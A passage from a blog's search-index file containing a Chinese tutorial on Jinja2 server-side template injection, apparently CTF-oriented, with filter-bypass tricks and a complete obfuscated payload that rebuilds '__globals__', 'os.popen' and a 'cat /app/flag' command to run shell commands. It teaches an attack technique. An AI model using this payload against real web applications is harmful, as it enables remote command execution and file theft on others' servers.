title="绕过数字"></a>绕过数字</h2><p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #获得字典拼接后字符串的长度</span><br></code></pre></td></tr></table></figure><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>开站</title>
    <link href="/tuyi/2025/01/12/%E5%BC%80%E7%AB%99/"/>
    <url>/tuyi/2025/01/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站，纪录自己的学习和分享一些东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
